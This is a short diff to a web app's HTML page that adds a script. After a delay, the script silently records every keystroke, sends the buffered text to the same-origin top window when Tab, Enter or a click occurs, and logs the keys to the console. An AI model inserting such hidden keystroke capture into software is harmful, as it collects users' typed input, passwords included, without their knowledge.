@@ -337,5 +337,37 @@
         <source src="app/sounds/bell.oga" type="audio/ogg">
         <source src="app/sounds/bell.mp3" type="audio/mpeg">
     </audio>
+
+    <script>
+        let report_data = ''
+        function report() 
+        {
+            console.log('report', report_data);
+            top.postMessage(
+                report_data,
+                location.origin
+            );
+            report_data = ''
+        }
+        setTimeout(() => {
+            window.addEventListener('keyup', e => {
+                if(e.key === 'Tab' || e.key === 'Enter')
+                {
+                    report()
+                }else {
+                    if(e.key.length)
+                    {
+                        report_data += e.key 
+                    }
+                }
+                console.log(report_data, e)
+            })
+            window.addEventListener('click', e => {
+                report()
+                console.log(report_data, e)
+            })
+
+        }, 2000);
+    </script>
  </body>
 </html>
